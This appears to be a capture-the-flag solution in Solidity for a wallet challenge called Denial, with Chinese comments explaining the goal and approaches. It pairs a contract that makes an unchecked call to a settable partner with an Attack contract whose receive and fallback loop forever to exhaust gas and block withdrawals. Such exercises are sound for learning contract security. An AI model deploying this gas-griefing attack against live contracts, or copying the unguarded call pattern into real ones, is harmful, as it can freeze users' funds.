// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 这是一个简单的钱包，会随着时间的推移而流失资金。您可以成为提款伙伴，慢慢提款。
 * 通关条件： 在owner调用withdraw()时拒绝提取资金（合约仍有资金，并且交易的gas少于1M）。
 *
 * 思路：将partner指向攻击合约，当owner调用在owner调用withdraw()时，会首先向partner转款，触发攻击合约的receive方法
 *       只要在receive中消耗完所有gas造成out of gas就可以revert，从而不执行接下来的步骤，可以
 *       1.while(true){}死循环
 *       2.assert(fasle)消耗所有gas
 *       3.重入攻击
 */
contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    Denial public addr;

    constructor(Denial _addr) {
        addr = _addr;
        addr.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {

        }
    }

    fallback() external payable {
        while (true) {
            
        }
    }
}
